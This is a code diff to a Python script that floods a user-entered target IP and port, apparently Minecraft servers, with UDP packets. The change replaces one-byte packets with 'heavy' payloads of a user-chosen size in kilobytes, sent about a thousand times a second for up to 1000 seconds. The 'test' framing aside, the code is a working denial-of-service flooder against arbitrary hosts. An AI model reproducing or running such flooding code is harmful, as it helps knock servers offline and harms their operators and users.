@@ -3,13 +3,25 @@ import socket
 import time
 import psutil
 
-def send_packets(host, port, num_packets_per_second, duration):
+def create_heavy_packet(size_in_bytes):
+    # Create a heavy packet (for example, a large message)
+    heavy_data = b'A' * size_in_bytes  # Create a byte string consisting of 'A's repeated size_in_bytes times
+    return heavy_data
+
+def write_packet_to_file(packet, filename):
+    # Write the heavy packet to a file
+    with open(filename, 'wb') as file:
+        file.write(packet)
+    print(f"Heavy packet written to {filename}")
+
+def send_packets(host, port, num_packets_per_second, duration, storage_per_packet):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         end_time = time.time() + duration
         packets_sent = 0
         while time.time() < end_time and packets_sent < num_packets_per_second * duration:
-            sock.sendto(b'\x00', (host, port))  # Sending an empty packet
+            heavy_packet = create_heavy_packet(storage_per_packet * 1024)  # Creating a heavy packet with size_in_bytes KB
+            sock.sendto(heavy_packet, (host, port))  # Sending the heavy packet
             packets_sent += 1
             time.sleep(0.001)  # Send packets thousand per second
         return packets_sent
@@ -35,10 +47,11 @@ if __name__ == "__main__":
     minecraft_host = input("Target IP address: ")
     minecraft_port = int(input("Target port: "))
     duration = int(input("Enter test duration (seconds, max 1000): "))
-    num_packets_per_second = int(input("Amout of packets (Empty) (max 1000000): "))
+    num_packets_per_second = int(input("Amount of packets (Empty) (max 1000000): "))
+    storage_per_packet = int(input("Storage Per Packet (KB): "))
     duration = min(duration, 1000)  # Limit max test duration to 1000 seconds
     num_packets_per_second = min(num_packets_per_second, 1000000)  # Limit max packets per second to 1000000
-    total_packets_sent = send_packets(minecraft_host, minecraft_port, num_packets_per_second, duration)
+    total_packets_sent = send_packets(minecraft_host, minecraft_port, num_packets_per_second, duration, storage_per_packet)
     if total_packets_sent != -1:
         overall_packets_sent = total_packets_sent
         while True:
